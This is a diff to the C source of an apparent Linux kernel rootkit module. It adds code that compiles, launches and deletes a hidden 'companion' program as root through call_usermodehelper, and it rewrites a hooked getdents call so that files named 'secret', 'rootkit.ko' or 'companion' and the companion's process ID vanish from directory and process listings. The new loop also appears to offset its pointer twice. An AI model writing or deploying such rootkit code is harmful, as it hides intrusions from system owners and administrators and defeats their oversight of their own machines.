@@ -1,30 +1,50 @@
 #include "hide.h"
 
-void launch_companion(void) {
-    char *argv[] = {"/start_companion", NULL};
-    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+void compile_companion(void) {
+    char *argv[] = {"/usr/bin/gcc", "/root/companion.c", "-o", "bin/companion", NULL};
+    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
     int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if (r) {
+    if (r >= 0) {
+      printk(KERN_INFO "Companion compiled\n");
+    } else {
+      printk(KERN_INFO "Fail %i\n", r);
+    }
+} 
+
+void launch_companion(void) {
+
+    char *argv[] = {"/bin/companion", NULL};
+    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (r >= 0) {
       printk(KERN_INFO "Companion launched\n");
+    } else {
+      printk(KERN_INFO "Fail\n");
+    }
+}
+
+void delete_binary(void) {
+    char *argv[] = {"/bin/rm", "/bin/companion", NULL};
+    char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (r >= 0) {
+      printk(KERN_INFO "Companion removed\n");
+    } else {
+      printk(KERN_INFO "Fail\n");
     }
 }
 
 void get_pid_companion(void) {
     struct task_struct *task;
     pid_t pid_buff = -1;
-    printk(KERN_INFO "PLEASE");
     for_each_process(task) {
-      if (!strcmp(task->comm, "/bin/companion")) {
+      if (!strcmp(task->comm, "companion")) {
         g_pid_companion = task->pid;
-        printk(KERN_INFO "PLEASE2");
         break ;
       }
       pid_buff = task->pid;
     }
 }
-
-
-
 
 static int find_sys_call_addr(t_ftrace_hook *hook) {
     hook->address = kallsyms_lookup_name(hook->name);
@@ -115,53 +135,70 @@ static bool is_numeric(char *str) {
   return (i == strlen(str));
 }
 
+bool is_current_file_to_hide(char *filename) {
+    char *string_to_hide[] = {"secret", "rootkit.ko", "companion", "companion.c", NULL};
+
+    int i = 0;
+    while (string_to_hide[i] != NULL) {
+	if (strstr(filename, string_to_hide[i]) != NULL) {
+		return true;
+        	//to_hide += dirent_buff->d_reclen;
+        //	memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
+        //	break ;
+      	}
+        i++;
+    }
+    return false;
+}
+
+bool is_a_pid_to_hide(char *filename) {
+
+    int buff_pid = -1;
+
+    if (filename && is_numeric(filename)) {
+        buff_pid = (int)simple_strtol(filename, NULL, 10);
+
+        if (buff_pid == g_pid_companion) {
+		return (true);
+	}
+    }
+    return (false);
+}
+
+int loop_current_dirent (int size_dirent, struct linux_dirent64 __user *dirent) {
+
+	int pos_idx = 0;
+	int to_hide_bytes = 0;
+	void *dirent_original = (void *)dirent;
+	int ret_size = 0;
+
+	
+	while (pos_idx + to_hide_bytes < size_dirent) {
+		struct linux_dirent64 *dirent_buffer = (struct linux_dirent64 *)(dirent_original + pos_idx);
+		if (is_current_file_to_hide(dirent_buffer->d_name) || is_a_pid_to_hide(dirent_buffer->d_name)) {
+
+			void *current_pos = (void *)dirent_buffer + pos_idx;
+			void *next_pos = (void *)dirent_buffer + pos_idx + dirent_buffer->d_reclen;
+			int  unbrowsed_bytes = size_dirent - (pos_idx + dirent_buffer->d_reclen);
+
+            		memcpy(current_pos, next_pos, unbrowsed_bytes);
+            		to_hide_bytes += dirent_buffer->d_reclen;
+			continue ;
+		}
+      		pos_idx += dirent_buffer->d_reclen;
+	}
+	ret_size = pos_idx;
+	return ret_size;
+}
+
 asmlinkage long myGetDents(const struct pt_regs *regs) {
 
-    // printk(KERN_INFO "Hello there\n");
-    int dirent_idx = 0;
-    int buff_pid = -1;
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
-    struct linux_dirent64* dirent_buff;
-//  long int          count = regs->dx;
-//  long unsigned int fd = regs->di;
-
     int getdent_ret = g_original_getdents(regs);
-
     if (getdent_ret <= 0) 
         return getdent_ret;
     
-    void *dbuf = (void *)(dirent);
-  //array of "string to hide"
-    char *string_to_hide[] = {"rootkit.ko", NULL};
-    int to_hide = 0;
-
-    while (dirent_idx + to_hide< getdent_ret) {
-      dirent_buff = (struct linux_dirent64 *)(dbuf + dirent_idx);
-      int i = 0;
-      if (is_numeric(dirent_buff->d_name)) {
-        buff_pid = (int)simple_strtol(dirent_buff->d_name, NULL, 10);
-        if (buff_pid == g_pid_companion) {
-            to_hide += dirent_buff->d_reclen;
-            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
-            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
-        }
-      } else {
-        while (string_to_hide[i] != NULL) {
-          if (strstr(dirent_buff->d_name, string_to_hide[i]) != NULL) {
-            to_hide += dirent_buff->d_reclen;
-            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
-            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
-            break ;
-          }
-          i++;
-        }
-      }
-    if (string_to_hide[i] == NULL || buff_pid != g_pid_companion) {
-      // We increment only when it's not a match
-      dirent_idx += dirent_buff->d_reclen;
-    }
-  }
-
+	int ret = loop_current_dirent(getdent_ret, dirent);
     /*
    printf("%-10s ", (d_type == DT_REG) ?  "regular" :
    (d_type == DT_DIR) ?  "directory" :
@@ -171,5 +208,5 @@ asmlinkage long myGetDents(const struct pt_regs *regs) {
    (d_type == DT_BLK) ?  "block dev" :
    (d_type == DT_CHR) ?  "char dev" : "???");
     */
-	  return dirent_idx;
+	  return ret;
 }
